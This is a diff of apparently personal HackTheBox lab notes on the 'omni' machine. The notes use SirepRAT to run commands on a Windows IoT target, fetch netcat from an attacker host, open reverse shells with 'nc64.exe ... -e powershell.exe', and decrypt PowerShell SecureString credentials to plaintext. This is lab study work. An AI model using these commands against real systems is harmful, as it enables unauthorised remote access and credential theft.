@@ -1,5 +1,20 @@
+---
+title: Lab - HackyHour4
+date: 2020-11-13 11:11:11 -0400
+description: Learning Path
+categories: [Lab, HackTheBox]
+# img: /assets/img/sample/rabbit.png
+tags: [Lab, HackTheBox]
+---
+
+[toc]
+
+---
 
 
+# omni
+
+> Machine: omni
 
 
 ```bash
@@ -80,7 +95,7 @@ python SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\Windows\Syst
 # localhost name resolution is handled within DNS itself.
 #	127.0.0.1       localhost
 #	::1             localhost
-
+–
 
 
 # put file and get file
@@ -91,9 +106,6 @@ python SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\Windows\Syst
 
 
 # run command
-python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c echo {{userprofile}}"
-# C:\Data\Users\DefaultAccount
-
 python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell"
 # <HResultResult | type: 1, payload length: 4, HResult: 0x0>
 # <OutputStreamResult | type: 11, payload length: 82, payload peek: 'Windows PowerShell Copyright (C) Microsoft Corpo'>
@@ -101,25 +113,8 @@ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C
 
 
 
-
-# Download File
-python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell.exe -command Invoke-WebRequest -Uri http://10.10.15.28:9200/nc64.exe -Outfile C:\tests\nc64.exe"
-
-
-python /home/grace/htb4/SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell.exe -command Invoke-WebRequest -Uri http://10.10.15.28:9200/func.ps1 -Outfile C:\Data\Users\app\func.ps1"
-
-
-
-
-
-# Execute File To Conect Back
-python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell.exe -command C:\tests\nc64.exe 10.10.15.28 4444 -e powershell.exe"
-
-
+# upload something
 python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell Invoke-Webrequest -Outfile C:\blah.txt -Uri http://10.10.15.28/inject.sql" --v
-
-
-
 python SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\blah.txt" --v
 # ---------
 # CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
@@ -131,6 +126,9 @@ python SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\blah.txt" --
 # ---------
 
 
+
+
+# put the output in to the file
 python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell ls C:\Data\Users\DefaultAccount > C:\Windows\System32\grace2.txt"
 python SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\Windows\System32\grace2.txt" --v
 # ---------
@@ -162,26 +160,63 @@ python SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\Windows\Syst
 # ---------
 
 
+
+# -----------------------------------------------------------------------------------------------------------------------
+
+
+
 # download the netcat
 wget https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip
 unzip netcat-win32-1.11.zip 
 sudo rm netcat-win32-1.11.zip 
 
 
-# able to upload file to target
-python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-Webrequest -Outfile C:\blah.txt -Uri http://10.10.15.28/inject.sql" --v
-
-
+# open cd
 # open web on my side
 python -m SimpleHTTPServer 9000
 # listen netcet at my side
 netcat -nlvp 4455
 
 
+
+
+# upload nv64.exe
+
+# upload
+python SirepRAT.py 10.10.10.204 PutFileOnDevice --remote_path "C:\test\nc64.exe" --data /home/kali/nc.exe/nc64.exe
+# upload
+python SirepRAT.py 10.10.10.204 PutFileOnDevice --remote_path "C:\Data\Users\app\gracepw.txt" --data /home/grace/htb4/SirepRAT/gracepw.txt
+
+# run command to upload
+python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell.exe -command Invoke-WebRequest -Uri http://10.10.15.28:9002/nc64.exe -Outfile C:\tests\nc64.exe"
+
+
+python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell.exe -command Invoke-WebRequest -Uri http://10.10.15.28:9000/func.ps1 -Outfile C:\Data\Users\app\func.ps1"
+
+python SirepRAT.py 10.10.10.204 GetFileInformationFromDevice --remote_path "C:\test\nc64.exe"
+
+python SirepRAT.py 10.10.10.204 GetFileInformationFromDevice --remote_path "c:\Windows\nc64.exe"
+
 # upload the netcat on target
 python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-Webrequest -Outfile C:\nc64.exe -Uri http://10.10.15.28:9200/home/grace/htb4/netcat-1.11/nc64.exe" --v
 
-$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c c:\nc64.exe 10.10.15.28 4455 -e powershell.exe" --v
+
+
+
+
+# Execute File To Conect Back
+python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c c:\Windows\nc64.exe 10.10.15.28 4455 -e powershell.exe"
+
+python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\test\nc64.exe 10.10.15.28 4455 -e powershell.exe" --v
+
+# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell.exe -command C:\tests\nc64.exe 10.10.15.28 4455 -e powershell.exe"
+
+python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c c:\nc64.exe 10.10.15.28 4455 -e powershell.exe" --v
+
+
+
+# -----------------------------------------------------------------------------------------------------------------------
+
 
 
 # the target > 10.10.15.28 4455 > my pc
@@ -236,10 +271,76 @@ PS C:\Data\Users\app> cat user.txt
 
 
 
+# ------------------------------ from txt to System.Security.SecureString 
+PS C:\>$encrypted 
+01000000d08c9ddf0115d1118c7a00c04fc297eb010000001a114d45b8dd3f4aa11ad7c0abdae9800000000002000000000003660000a8000000100000005df63cea84bfb7d70bd6842e7 
+efa79820000000004800000a000000010000000f10cd0f4a99a8d5814d94e0687d7430b100000008bf11f1960158405b2779613e9352c6d14000000e6b7bf46a9d485ff211b9b2a2df3bd 
+6eb67aae41 
+PS C:\>$secure2 = convertto-securestring -string $encrypted 
+PS C:\>$secure2 
+System.Security.SecureString 
+
+
+
+# ------------------------------ create PSCredential
+$user99 = "flag"
+$file99 = "gracepw.txt"
+$passwor99 = ConvertTo-SecureString '01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7' -AsPlainText -Force
+$credential99 = New-Object -TypeName "System.Management.Automation.PSCredential" -ArgumentList $User99, $passwor99
+$session = New-PSSession -computer 10.10.10.204 -credential $credential
+
+$bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecureString);
+
+$bstr = [Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($credential99);
+
+
+# ------------------------------ the way to create pw 1
+$user = "grace"
+$password = ConvertTo-SecureString -String "password" -AsPlainText -Force
+$credential = New-Object -TypeName "System.Management.Automation.PSCredential" -ArgumentList $user, $password
+
+$session = New-PSSession -computer 10.10.10.204 -credential $credential
+$result = Invoke-Command -Session $session -ScriptBlock {Add-PSSnapin vm*}
+$result = Invoke-Command -Session $session -ScriptBlock {get-desktopvm -pool_id olanddesk}
+$result
+连接远程服务器使用
+enter-pssession -computer ip -credential domain\username
+
+
+# the way to create pw
+$HexPass = Get-Content "c:\Data\Password.txt"
+$Credential = New-Object -TypeName PSCredential -ArgumentList "adm.ms@easy365manager.com", ($HexPass | ConvertTo-SecureString)
+
+
+$Ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($password)
+$result = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($Ptr)
+[System.Runtime.InteropServices.Marshal]::ZeroFreeCoTaskMemUnicode($Ptr)
+$result 
+
+
+$credentials99 = New-Object System.Net.NetworkCredential("flag", $passwor99, "TestDomain")
+$credentials99.Password
+TestPassword
+
+$credentials99 | gm
+
+
+
+# ------------------------- begin
+
 
 $passwordgg = ConvertTo-SecureString '01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7' -AsPlainText -Force
 
 $credentialgg = New-Object System.Management.Automation.PSCredential ('root', $passwordgg)
+
+$credentials99=Get-Credential
+$credentials99.GetNetworkCredential().UserName
+TestUsername
+$credentials99.GetNetworkCredential().Domain
+TestDomain
+$credentials99.GetNetworkCredential().Password
+TestPassword
+
 
 PS> $credentialgg.UserName
 # root
@@ -251,7 +352,6 @@ PS> $credentialgg.GetNetworkCredential()
 
 PS51> $credentialgg.GetNetworkCredential().Password
 # MySecretPassword
-
 
 $securePassword = '01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7' 
 
@@ -289,6 +389,8 @@ function Get-PlainText()
 	}
 	END { }
 }
+
+
 
 ```
 
@@ -552,3 +654,15 @@ if "__main__" == __name__:
 
 ref:
 - [github](https://github.com/SafeBreach-Labs/SirepRAT)
+- [PowerShell - 解碼System.Security.SecureString爲可讀密碼](http://hk.uwenku.com/question/p-zubpcrmb-ys.html)
+- [PowerShell - Get-Credential解碼密碼？](http://hk.uwenku.com/question/p-etehoiap-vb.html)
+- [Decrypt PowerShell Secure String Password](https://devblogs.microsoft.com/scripting/decrypt-powershell-secure-string-password/)
+- [PowerShell - Decode System.Security.SecureString to readable password](https://stackoverflow.com/questions/7468389/powershell-decode-system-security-securestring-to-readable-password)
+- [Secure Password with PowerShell: Encrypting Credentials – Part 1](https://www.pdq.com/blog/secure-password-with-powershell-encrypting-credentials-part-1/)
+- [PSCredential](https://www.easy365manager.com/pscredential/)
+- [SecureString Class](https://docs.microsoft.com/en-us/dotnet/api/system.security.securestring?view=net-5.0)
+- [PowerShell自动加载账号密码(Credential)](https://www.hotbak.net/key/%E5%8A%A0%E8%BD%BD%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81CredentialcQ215046120%E7%9A%84%E5%8D%9A%E5%AE%A2CSDN%E5%8D%9A%E5%AE%A2.html?__cf_chl_jschl_tk__=3e69070d4030385254fac4ca496d4c3991f969af-1607738792-0-AUQnWccIaluGMlCJdNCqTDC3LLqUcd8cMptjuojf0k9_etAKJ50nN-ae06mLp6oVJZVT4K_ZyjiC_5_mPfeI1wrpGUiqT3Vr1asdFSktwfcnDVmufvdgSEoGFhQLmde_RgRCCTHc8zdAC1pY_iko516_EQ_Xx1tnaIGKdJALI4DJfUKr274oc03MhM32LZHj75zhrp_i3F-tOQ4-pj4-FvXOyd0s7-HKC6aYUBS7547gO1b-yczmHeB10VKSwChn-PDKV4tPMVMN7zfLgujeaBSsDj_1D23amQOE2_L0a5Us5CfOFTvKD6P1iCRE1_uADv-JJzSgwmcGD9VTyelwHd80lHWPz2mC0L9Xh0dKIoLlJ6S-eBjceZMh3g5XUo7RVbTLEF8KU5q3XgShUWT7FZhmyn-IjZ5jSPW1XQQjJkRJtYV2V-zVzmGK6HXct81314kFn_YZtzb49d0b8s5-VnjiN10c6F0CpGfKysE5NynPBK24FRBUeZ4F_dQ-exyzk-UG61lOOGIw0cD49YS9syEaCs2oB5IsNMLKtR7lxoX5)
+- [ConvertTo-SecureString的这种用法实现了什么？](https://stackoverrun.com/cn/q/7601500)
+- [PowerShell: Encrypt and Decrypt Data by using Certificates (Public Key / Private Key)](https://sid-500.com/2017/10/29/powershell-encrypt-and-decrypt-data/)
+- [PowerShell 脚本中的密码](https://www.cnblogs.com/sparkdev/p/7258507.html)
+- [Using the PowerShell Get-Credential Cmdlet and all things credentials](https://adamtheautomator.com/powershell-get-credential/)
